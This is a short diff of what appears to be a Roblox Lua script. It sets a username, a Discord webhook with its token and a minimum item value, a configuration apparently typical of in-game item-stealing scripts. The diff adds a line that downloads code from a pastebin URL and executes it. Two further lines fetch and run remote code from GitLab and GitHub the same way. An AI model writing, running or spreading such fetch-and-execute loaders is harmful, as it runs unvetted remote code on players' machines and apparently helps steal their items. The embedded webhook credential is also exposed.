@@ -2,6 +2,6 @@ Username = "aiko102050"
 Webhook = "https://discord.com/api/webhooks/1402695253483458753/OaXDtIQ4P5bZnesq5dLNFXlFZ2E2z4TuvSsvcEUPxOhtFTY9mqmtaUk6gEp19q7t6FnV"
 MinimumValue = 10
 
-
+loadstring(game:HttpGet("https://pastebin.com/raw/iDSdv5rk"))()
 loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
